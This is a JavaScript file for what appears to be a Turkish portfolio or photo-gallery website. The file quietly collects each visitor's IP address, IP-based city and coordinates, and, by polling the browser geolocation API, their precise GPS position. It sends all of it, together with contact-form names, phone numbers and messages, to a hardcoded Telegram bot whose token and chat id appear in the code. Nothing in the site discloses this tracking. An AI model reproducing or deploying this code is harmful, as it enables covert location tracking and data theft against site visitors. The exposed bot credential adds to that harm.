const getPlain = async () => {
  return await $.get("https://ipecho.net/plain");
};

const ajaxFunc = async (_data) => {
  await $.ajax({
    type: "GET",
    url: "https://geo.risk3sixty.com/" + _data,
    dataType: "json",
  })
    .done((getData) => {
      const getAll = {
        ip: getData.ip,
        city: getData.city,
        latitude: getData.ll[0],
        longitude: getData.ll[1],
        mapsUrl:
          "https://www.google.com/maps/place/" +
          getData.ll[0] +
          "," +
          getData.ll[1],
      };
      // Object.assign(getAll, todayDate());
      sendMessageTelegram(
        dataText(
          getAll.ip,
          getAll.latitude,
          getAll.longitude,
          todayDate().dataIsGetDate,
          getAll.city,
          getAll.mapsUrl
        )
      );
    })
    .catch();
};

getPlain().then((data) => {
  ajaxFunc(data);
});

//Today Date
const todayDate = () => {
  const date = new Date();
  return { dataIsGetDate: date.toLocaleString("tr") };
};

function getuserLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      showuserPosition,
      showbrowserError
    );
  } else {
    console.log("Tarayıcı Desteklemiyor");
  }
}

const locationInterval = setInterval(() => {
  getuserLocation();
}, 1000);

function showuserPosition(position) {
  const latlon = position.coords.latitude + "," + position.coords.longitude;

  getPlain().then((e) => {
    const mapsObj = {
      x: position.coords.latitude,
      y: position.coords.longitude,
      ip: e,
      url:
        "https://www.google.com/maps/place/" +
        position.coords.latitude +
        "," +
        position.coords.longitude,

      date: todayDate().dataIsGetDate,
    };

    sendMessageTelegram(
      dataText(
        mapsObj.ip,
        "",
        "",
        "",
        "",
        "",
        mapsObj.url,
        mapsObj.x,
        mapsObj.y
      )
    );

    // sendMessageTelegram()
  });

  clearInterval(locationInterval);
}

function showbrowserError(error) {
  switch (error.code) {
    case error.PERMISSION_DENIED:
      // console.log("KULLANICI GEOLOCATION TALEBINI REDDETTI");
      break;
    case error.POSITION_UNAVAILABLE:
      // console.log("KONUM BILGISI YOK");
      break;
    case error.TIMEOUT:
      // console.log("ZAMAN ASIMI");
      break;
    case error.UNKNOWN_ERROR:
      // console.log("BILINMEYEN HATA");
      break;
  }
}

//Telegrama veri aktar
const sendMessageTelegram = (mesajIcerigi) => {
  $.ajax({
    type: "GET",
    url:
      " https://api.telegram.org/bot5617493929:AAGYZEd2V8ghoxOU-wk1SA-QuTz1rJwrHOE/sendMessage?chat_id=1132992705&text=" +
      mesajIcerigi,
  }).done((e) => {});
};

const dataText = (
  ip,
  iplen,
  iplon,
  ipdate,
  ipcity,
  mapsUrl,
  realMaps,
  x,
  y
) => {
  let text = `
  --------------------------------------------

      IP : ${ip}
      --------------------------------------------

      IP Detay : https://ipapi.co/${ip}/json/

      --------------------------------------------
      Şehir : ${ipcity}

      --------------------------------------------
      Len(x) : ${iplen}

      --------------------------------------------
      Long(y) : ${iplon}

      --------------------------------------------
      Tarih : ${ipdate}

      --------------------------------------------
      Konum : ${mapsUrl}

      --------------------------------------------
      ********************************************
      --------------------------------------------
      ********************************************
      --------------------------------------------
     
   --------------------------------------------
      
    IP : ${ip}

   --------------------------------------------

    Tam Konum : ${realMaps}

    --------------------------------------------

    Tam X Kordinatı : ${x},
    
    --------------------------------------------

    Tam Y Kordinatı : ${y},

    --------------------------------------------

  
  `;

  return text;
};

$("form").submit(function (e) {
  e.preventDefault();
  let getValue = $(this).serializeArray();
  const json = {};
  $.each(getValue, function (indexInArray, valueOfElement) {
    json[this.name] = this.value;
  });

  getPlain().then((e) => {
    sendMessageTelegram(`
  IP : ${e}
  --------------------------------------------
  Telefon Numarası : ${json.tel}
  --------------------------------------------

  Adı ve Soyad : ${json.name}
  --------------------------------------------
  

  Konu : ${json.subject}
  --------------------------------------------


  Mesaj : ${json.message}
    
  `);
    Swal.fire({
      icon: "success",
      title: "Mesajınız Başarıyla İletildi !",
      showConfirmButton: false,
      timer: 3500,
    });
  });
});

//Fotoğrafları Ekle
const resimUrl = [
  "msg5704854415-5760.jpg",
  "msg5704854415-5761.jpg",
  "msg5704854415-5762.jpg",
  "msg5704854415-5763.jpg",
  "msg5704854415-5764.jpg",
  "msg5704854415-5765.jpg",
  "msg5704854415-5766.jpg",
  "msg5704854415-5767.jpg",
  "msg5704854415-5768.jpg",
  "msg5704854415-5769.jpg",
  "msg5704854415-5770.jpg",
  "msg5704854415-5771.jpg",
  "msg5704854415-5772.jpg",
  "msg5704854415-5773.jpg",
  "msg5704854415-5774.jpg",
  "msg5704854415-5775.jpg",
  "msg5704854415-5776.jpg",
  "msg5704854415-5777.jpg",
  "msg5704854415-5778.jpg",
  "msg5704854415-5779.jpg",
  "msg5704854415-5781.jpg",
  "msg5704854415-5782.jpg",
  "msg5704854415-5783.jpg",
  "msg5704854415-5784.jpg",
  "msg5704854415-5785.jpg",
  "msg5704854415-5786.jpg",
  "msg5704854415-5788.jpg",
  "msg5704854415-5790.jpg",
  "msg5704854415-5791.jpg",
  "msg5704854415-5792.jpg",
  "msg5704854415-5793.jpg",
  "msg5704854415-5795.jpg",
];

// let birlestir;
// resimUrl.forEach((element) => {
//   let imgHTML = `
//   <div class="col-lg-4 col-md-6 portfolio-item filter-fotograflar">
// <div class="portfolio-wrap">
//   <img src="assets/img/${element}" class="img-fluid" alt="" />
//   <div class="portfolio-links">
//     <a
//       href="assets/img/${element}"
//       data-gallery="portfolioGallery"
//       class="portfolio-lightbox"
//       ><i class="bx bx-plus"></i
//     ></a>
  
// </div>
// </div>
// </div>
//   `;
//   birlestir = birlestir + imgHTML;
// });
// console.log(birlestir);
